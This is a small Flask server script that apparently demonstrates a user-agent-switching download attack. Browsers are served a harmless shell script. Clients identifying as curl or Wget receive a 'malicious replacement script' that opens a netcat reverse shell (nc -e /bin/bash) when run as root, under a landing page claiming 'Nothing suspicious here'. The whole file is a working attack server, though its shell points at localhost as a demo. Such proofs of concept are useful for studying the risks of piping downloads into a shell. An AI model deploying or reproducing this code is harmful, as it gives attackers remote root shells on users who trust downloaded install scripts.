from flask import Flask,request


app = Flask(__name__)

@app.route("/")
def landing_page():
    return "<a href='script.sh'>Feel free to download the script hosted!</a> \n <p><small>(Nothing suspicious here)</small></p>"


@app.route("/script.sh")
def script_download():
    agent=request.headers.get('User-Agent')
    if "curl" in agent or "Wget" in agent:
        value = """
            #!/bin/bash
            # Malicious replacement script 
            if [[ $EUID -ne 0 ]]; then
                echo Hello user $(id -un), I see you are using curl!
            else
                nc -e /bin/bash localhost 5555
            fi
            """
    else:
        value = """
            #!/bin/bash \n
            # Legit script, as downloaded without the curl user-agent \n
            echo Hello user $(id -un)!
            """
    return value
 
if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)